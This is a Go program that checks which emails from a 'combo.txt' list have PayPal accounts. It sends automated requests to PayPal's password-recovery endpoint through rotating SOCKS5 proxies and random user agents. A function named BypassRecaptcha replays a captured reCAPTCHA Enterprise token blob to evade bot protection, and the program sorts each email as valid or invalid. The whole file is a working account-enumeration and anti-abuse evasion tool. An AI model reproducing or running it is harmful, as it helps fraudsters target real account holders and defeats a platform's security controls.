package main

import (
  "fmt"
  "net/http"
  "io/ioutil"
  "net/http/cookiejar"
  "strings"
  "bytes"
  "strconv"
  "bufio"
  //"log"
  "os"
  "golang.org/x/net/proxy"
  "math/rand"
  "time"
  "net"
  "github.com/corpix/uarand"
)

type error interface {

    Error() string

}

func GetAnchor(client *http.Client) string {
  req, err := http.NewRequest("GET", "https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LdCCOUUAAAAAHTE-Snr6hi4HJGtJk_d1_ce-gWB&co=aHR0cHM6Ly93d3cucGF5cGFsb2JqZWN0cy5jb206NDQz&hl=fr&v=pRiAUlKgZOMcFLsfzZTeGtOA&size=invisible&cb=r8eyk3dzt4z7", nil)
  if err != nil {
    return "error"
  }
  res, err := client.Do(req)
  if err != nil {
    return "error"
  }
  defer res.Body.Close()
  body, err := ioutil.ReadAll(res.Body)
  if err != nil {
    return "error"
  }
  //fmt.Println(string(body))
  if strings.Contains(string(body), `<input type="hidden" id="recaptcha-token" value="`) {
    token0 := strings.Split(string(body), `<input type="hidden" id="recaptcha-token" value="`)[1]
    token := strings.Split(token0, `"`)[0]
    return token
  } else {
    return "error"
  }
}

func GetTrust(CaptchaResp string, csrf string, ssessid string, reftime int64, V3start int64, V3end int64, useragent string, client *http.Client) string {
  payload := "_csrf=" + csrf + "&refTimestamp=" + strconv.FormatInt(reftime, 10) + "&grcV3EntToken=" + CaptchaResp + "&publicKey=6LdCCOUUAAAAAHTE-Snr6hi4HJGtJk_d1_ce-gWB&grcV3RenderStartTime=" + strconv.FormatInt(V3start, 10) + "&grcV3RenderEndTime=" + strconv.FormatInt(V3end, 10) + "&_sessionID=" + ssessid
  data := strings.NewReader(payload)
  req, err := http.NewRequest("POST", "https://www.paypal.com/auth/verifygrcenterprise", data)
  if err != nil {
    return "error"
  }
  content_lenght := len(payload)
  req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
  req.Header.Add("Content-Length", strconv.Itoa(content_lenght))
  req.Header.Add("Sec-Fetch-Site", "None")
  req.Header.Add("Sec-Fetch-Mode", "navigate")
  req.Header.Add("Sec-Fetch-User", "?1")
  req.Header.Add("Sec-Fetch-Dest", "document")
  req.Header.Add("User-Agent", useragent)
  req.Header.Add("origin", "https://www.paypal.com")
  req.Header.Add("referer", "https://www.paypal.com/authflow/password-recovery/")
  res, err := client.Do(req)
  if err != nil {
    return "error"
  }
  defer res.Body.Close()
  return strconv.Itoa(res.StatusCode)
}

func BypassRecaptcha(CaptchaToken string, client *http.Client) string {
  payload := strings.NewReader("v=pRiAUlKgZOMcFLsfzZTeGtOA&reason=q&c=" + CaptchaToken + "&k=6LdCCOUUAAAAAHTE-Snr6hi4HJGtJk_d1_ce-gWB&co=aHR0cHM6Ly93d3cucGF5cGFsb2JqZWN0cy5jb206NDQz&hl=en&size=invisible&chr=%5B41%2C86%2C37%5D&vh=15924040532&bg=!s7WgtfnIAAUjJDx_I0eeY81haWLa1T4AKQAjCPxGRN6l-LWNLATg-qp-xz5hEfdtNweqpAyNECn6JcCcgO4V-nXiBwAAAOFXAAAAB20BB5wJ9AS-WFQhaUAkCYHKmSouWqaU7vP0DHfoHAemu8UnIqdRXjquBB0k1YjHaZlQ505A_Tl--m0S73-BosXfNcrJrtC7hYIWcvoy9-knDXHM4FFa8SbLBhABx6cpNg5l7jDBiREKQfdqaIVFifvM1XR-JqYNr9wC6X8aaqB6nVLUCnpNZcl5NLMKlb83HJwHJPCfgP2skVSVh1Ch2tb6HRgv8yH4up22IzJcV8hI4nx5yPufrpe7sHPV-m2BqmVr9O-Q6CbvgT_O5qnyYa0YJtfLx49yvoagghNUHmXj10wbsu9p9AtqersFI3U1SKDoC9RLfwGjOO_ASJu1xlxOMuHkz-OUEROHUQzjFiuyN5KwKg10kdGvGJsiLybzQJETuNS1-S1LvAocZR3FKPZtlrdMQ3Mh3P8kv7IaOX1yOHkjOeYpUp2j2HaJUTqHOGu3UBpxx18b2VL3mXId3P5t2KZAETEzhxdz45VvPXr1iphzsrEnvwkHJYaAuvGphBSVLAGvWBCq6lcJXWMPmE1bzDfqlH9zL6_bIJdJXSE6ECwIQEjn8ptg54W_YeMPSV8k53R7N73RAG13wVBjWNoVF_W10qAQneFwxAUxZjV1whiFDmNM_fjVYg0DdSVi3az2G5LWFwdqvuc1MQNF1TmAvOYCa3lK7VeNot9Ht-7gbM2cdngnqhZe_7XAJhunbaQkyJEIq4Aiip3UE2lRuVuovJkh7RQIhEwJT6UN12cCT1r6--M19-7NomESyF7onvC3abIVjQtQe9Ju4eLMbHgB6u0MjAiVY20VtqQ9bqb4wKwmWcWdzcMqoYForRbijb1AGaJCgAWuN_E1kxcNuJmGo5pys4YcWnzLmbF5mWwvzaQrZVPAJrjemZvQJo5Q1-pW6u-hY2ZQmLLdbqqhfdKOUzsND2BY5SC_cIvwTPLFT2FriHpZlQFw9wPzmvFQ8U2TBE2FtVfbNYJ0K49sZv75GZodYbtzonm4m6k47pThRHggQA4Gcug5UGkyG1jZw-ZI5sh4twhhM52gDIbMyGQ64zdsW8QQo_h9iE1iHWaOtLSLGoyL3450gzwZB06nRCT8Q2TOM6UOMlFv6ew2aBb7GOW_RpPqZSbBC914O3R3h4iOdVyJHR50RkNzO5ziKEyt7VnjgKxYHAZGvF5LW6HCBbY6osnKuUj2J8OCX5YrRdD_6eR4LoyiJ5l3yh4wRUB6N-mS3jwZ9d9k7LeRQl3JDjsLpKcnEoToOPntTv_utviS50UN1WU42Yi8oSeIYNTrl1ucIiLxUfdZagTIrQpl1ZiBv2t-w_-QJdhse0g9F_pbVJxhkfGvXkuxOh83PN840YcWUJrr6geoXFR3u7qrROKML-2IrmrPfm7Yp05FuSR3UiylMnZdXRc0vBROLXvAr3xPJnEeb0cd2hzUKDiJEt5T3mQiAvd9G7RI6Yz31QqkqGztmmTYhrxnxzDnhTfmADyWDxD3zfGA5lqg6tRTqTpRnir9qVK3O6YxOf4e4MGQlbZ_Toj2zh3raO23kjRbu4ytwq0x6vQRwO4EKXO_qbVvBjcvisjnrY4kpAcQtomJ-q65s1ICdME3AYBwdTld4b66zbu4CJbDZcY04HMilxGn9l0TSTziuZOr2KDb0PaxjKWjXiTrg5oG2V7ipWX-liNd85t9eMVm0hcT4rJY2O-ivr1PAwYs3m8B39OfA_uV8JvtesZIwHBHkEpIetxmpiaa75CJOPwfbMDaAaZgQIwggt-I5PqkOooJwTNgOjN0p8T-v0ytvmYVhY3cDgnYGAOhUBvqGDS_ipo32hDiv4QRLCmqumiWekqIpXZZtmK7ryD2nqH7hotw9yUpNRouzMMueo-Isq9V-OaH6QZk0HvuMsw2p-uaS93ftgJWjI_I_XLezOIb2-5154yG1F2oHKvNuNw7NTwNYL5Ch75e_v2xi1Ohqmx-l2iYaWE6kvcvnhHkc4WaSzAfjw3aYgMJTShg_nH2rBW-GPbKAKVLqGS60jUNx-1ypNkjisREN59mD4R7Tw-zBI6zvA5RQ9XQx18wQpHuvkQw4EegTgCCoUbDX5vsC54kEw-uHQzzQMctsROFKSV3Jyn6igwUL43kFJpt3dAbVoWCl3MpgUBf9g4EoFfqaYdvC6ufGfIytNOra6sekwadLXR5Gye_Z3vb9j3n7f5OJtViL_00043QKLpUsnq1wU3cvdYTHfNYlWKuXp2vkPmxizeVF8Qa4pwKddMcPakM_AA5Gp5iGdKoURgEaBpr8MsVB18Ah5bop5vjn7yK_u17mmeNKk5SauXDEi4qt91Y6PEaoznMos3QeEWqAg7qKyCeJzi4JRv6m10S-ub4JnMWgPmhCLPrr3B2e6lnLXh4N-Tw6Vuy4-S_xsI89OFrKjEdU5OrS1GgaGgWw10ferw5g8xE5QILmoS0QAzxm0pYhCPKKO7f01913EeX7HpTiZXuW-YMXpoTuFGJCy_4fme1tT8fi0UtPX5FzEQb-IO6Ex5tce6_BjmXaM6jyrgJAh_8vMP13ufDQWYm7GRt1dTg3SK-8NCh4RlHMAZyqZ56B3J6RNaUtt6F4HgrZAeNAuJLKT0zGnUBRX1EeKopwZF9DlTjqOIERbSY82WMBPaQT071v9Eie1DQEQ7iWkIZkWt_CqtYourqubxXrK3wKG_FI34Wfcl4E-RIlye4M3BTASKWAKBYERzxiqtPk-5j727xkZ8qqmXjzBuqJZMmLGkAiBGLoeOTrOIwopezriho_bt_aqp7ismL16Tj3MlIwrct2i5_6GqUThqpUeN5Y_mONvNLiZevojHE-HlSL7I-ZCyMuWg7BgrppSo3G1C_7HjrcK1s6gB503lv7yih3d4iNmtwMUcPd7vik39XfYMiVriwdgfKN0OBhgDMPDG30QZTnBFQ6vXPVX2pA_-RPmCilK0QiM_Bj-s5-zbM3SE9mxYZepRTHM2JyGmuXoNPNvkZzOvOlHIl2th18-aJtCnZ78r9Sh3rCqEMXCBlrSPzbMaNDItC6nSsf-_TDmvTao2roMz1CCIzJbiRkAdwkltd6LGWVIrpH617lXPiLwzil9iOjFZVQI2BHt9ajk8XuFRE0oX9yBrZt6srdq56tZW5ezdHfKEo7raZnLsktocEFHQ0nENOgAQWTe0kOCIcWHvk6Ls4cGc_HyvHVNRc-LOEHOKaZT282k4iWHlcT45Tw-4pqnkovB0X4AGfnYEKKNrhxwDUyHklBJknfxSSNCnBY-zMCe45e1AYZyD01cC_W-oJzIijGaU2llbyGmmo7TGaiGl50-ZXp3pzuFiRMbk356AEWFcO6aWFQ9l5yhEqNthEJbGLVmHXeFtCjJtBv6efAJc6NH86xPgCeBYPR_tnuBEY5x5lrJbbwzGTZEPMTXM*")
  req, err := http.NewRequest("POST", "https://www.google.com/recaptcha/api2/reload?k=6LdCCOUUAAAAAHTE-Snr6hi4HJGtJk_d1_ce-gWB", payload)
  if err != nil {
    return "error"
  }
  req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
  res, err := client.Do(req)
  if err != nil {
    return "error"
  }
  defer res.Body.Close()
  body, err := ioutil.ReadAll(res.Body)
  if err != nil {
    return "error"
  }
  //fmt.Println(string(body))
  if strings.Contains(string(body), `rresp","`) {
    CaptchaResponse0 := strings.Split(string(body), `rresp","`)[1]
    CaptchaResponse := strings.Split(CaptchaResponse0, `"`)[0]
    return CaptchaResponse
  } else {
    return "error"
  }
}

func get2csrf(client *http.Client) string {
  req, err := http.NewRequest("GET", "https://www.paypal.com/auth/createchallenge/7a2dd159dce3e83c/recaptchav3.js", nil)
  if err != nil {
    return "error"
  }
  res, err := client.Do(req)
  if err != nil {
    return "error"
  }
  body, err := ioutil.ReadAll(res.Body)
  if err != nil {
    return "error"
  }
  if strings.Contains(string(body), `_csrf=','`) {
    csrfnew0 := strings.Split(string(body), `_csrf=','`)[1]
    csrfnew := strings.Split(csrfnew0, `','`)[0]
    return csrfnew
  } else {
    return "error"
  }
}

func gettoken(client *http.Client, useragent string) string {
  req, err := http.NewRequest("GET", "https://www.paypal.com/authflow/password-recovery/", nil)
  if err != nil {
    return "error"
  }
  req.Header.Add("Host", "www.paypal.com")
  req.Header.Add("Upgrade-Insecure-Requests", "1")
  req.Header.Add("Sec-Fetch-Site", "None")
  req.Header.Add("Sec-Fetch-Mode", "navigate")
  req.Header.Add("Sec-Fetch-User", "?1")
  req.Header.Add("Sec-Fetch-Dest", "document")
  req.Header.Add("User-Agent", useragent)
  res, err := client.Do(req)
  if err != nil {
    if strings.Contains(string(err.Error()), "socks connect") {
      return "badproxy"
    } else {
      return "error"
    }
  }
  defer res.Body.Close()
  body, err := ioutil.ReadAll(res.Body)
  if err != nil {
    return "error"
  }
  if strings.Contains(string(body), `csrf-token`) {
    csrf0 := strings.Split(string(body), `name="_csrf" value="`)[1]
    csrf_token := strings.Split(csrf0, `"`)[0]
    if strings.Contains(string(body), `recaptchav3.js"></script>`) {
      newcsrf := get2csrf(client)
      if newcsrf != "error" && newcsrf != "" {
        if strings.Contains(string(body), `SessionId":"`) {
          sessid0 := strings.Split(string(body), `SessionId":"`)[1]
          sessid := strings.Split(sessid0, `","`)[0]
          recaptcha_token := GetAnchor(client)
          if recaptcha_token != "error" {
            captcharesp := BypassRecaptcha(recaptcha_token, client)
            if captcharesp != "error" {
              reftime := time.Now().UnixNano() / int64(time.Millisecond)
              starttime := reftime + 500
              endtime := starttime + 800
              _ = GetTrust(captcharesp, newcsrf, sessid, reftime, starttime, endtime, useragent, client)
            }
          }
        }
      }
    }
  if strings.Contains(string(body), `require.js"></script>`) {
    return "badproxy"
  }
  if strings.Contains(string(body), `anw_sid`) {
    anw0 := strings.Split(string(body), `name="anw_sid" value="`)[1]
    awn_token := strings.Split(anw0, `"/>`)[0]
  return csrf_token + "|" + awn_token
  } else {
    return "error"
  }
  } else {
    return "error"
  }
}

func getpplresp(email string, csrf string, awntok string, client *http.Client, useragent string) string {
  payload := `{"email":"` + email + `","_csrf":"` + csrf + `","anw_sid":"` + awntok + `"}`
  content_lenght := len(payload)
  var jsonStr = []byte(payload)
  req, err := http.NewRequest("POST", "https://www.paypal.com/authflow/password-recovery", bytes.NewBuffer(jsonStr))
  if err != nil {
    return "error"
  }
  req.Header.Add("Host", "www.paypal.com")
  req.Header.Add("X-Requested-With", "XMLHttpRequest")
  req.Header.Add("Content-Type", "application/json")
  req.Header.Add("Origin", "https://www.paypal.com/")
  req.Header.Add("Sec-Fetch-Site", "same-origin")
  req.Header.Add("Sec-Fetch-Mode", "cors")
  req.Header.Add("Sec-Fetch-Dest", "empty")
  req.Header.Add("Referer", "https://www.paypal.com/authflow/password-recovery/")
  req.Header.Add("Content-Length", strconv.Itoa(content_lenght))
  req.Header.Add("User-Agent", useragent)
  res, err := client.Do(req)
  if err != nil {
    if strings.Contains(string(err.Error()), "socks connect") {
      return "badproxy"
    } else {
      return "error"
    }
  }
  defer res.Body.Close()
  body, err := ioutil.ReadAll(res.Body)
  if err != nil {
    return "error"
  }
  return string(body)
}

func checkemail(email string, client *http.Client, useragent string) string {
  tokens := gettoken(client, useragent)
  if tokens == "badproxy" {
    return "retry"
  }
  if tokens != "error" {
    csrf := strings.Split(tokens, "|")[0]
    awn := strings.Split(tokens, "|")[1]
    response := getpplresp(email, csrf, awn, client, useragent)
    if strings.Contains(response, "DOCTYPE html") {
      return "retry"
    }
    if strings.Contains(response, `require.js"></script></html>`) {
      return "retry"
    }
    if strings.Contains(response, "clientInstanceId") {
      return "invalid"
    }
    if strings.Contains(response, "UnauthorizedError") {
      return "valid"
    }
  } else {
    return "error"
  }
  return "error"
}

func athreadproxies(email string, proxies []string)  {
  colorReset := "\033[0m"
  colorRed := "\033[31m"
  colorGreen := "\033[32m"
  colorYellow := "\033[33m"
  colorOrange := "\033[95m"
  httpTransport := &http.Transport{}
  for {
    UA := uarand.GetRandom()
    rand.Seed(time.Now().Unix())
    random_index := rand.Intn(len(proxies))
    dialer, err := proxy.SOCKS5("tcp", proxies[random_index], nil, &net.Dialer{Timeout: time.Second * 5,})
	  if err != nil {
		  fmt.Println(err)
	  }
    var jar, _ = cookiejar.New(nil)
    var client = &http.Client{
        Jar: jar,
        Transport: httpTransport,
    }
    httpTransport.Dial = dialer.Dial
    resp := checkemail(email, client, UA)
    if resp == "error" {
      fmt.Println(string(colorOrange), email, string(colorReset))
    }
    if resp == "invalid" {
      fmt.Println(string(colorRed), email, string(colorReset))
      break
    }
    if resp == "retry" {
      fmt.Println(string(colorYellow), email, string(colorReset))
    }
    if resp == "valid" {
      fmt.Println(string(colorGreen), email, string(colorReset))
      break
    }
  }
}

func readLines(path string) ([]string, error) {
    file, err := os.Open(path)
    if err != nil {
        return nil, err
    }
    defer file.Close()
    var lines []string
    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        lines = append(lines, scanner.Text())
    }
    return lines, scanner.Err()
}

func main()  {
  fmt.Println(" Chargement de la combolist...")
  combolist, err := readLines("combo.txt")
  if err != nil {
    fmt.Println(err)
  }
  fmt.Println(" Combolist chargée !")
  fmt.Println(" Chargement des proxies...")
  proxies, err := readLines("proxies.txt")
  if err != nil {
      fmt.Println(err)
  }
  fmt.Println(" Proxies chargés !")
  for _, email := range(combolist) {
    go athreadproxies(email, proxies)
  }
  for {

  }
}
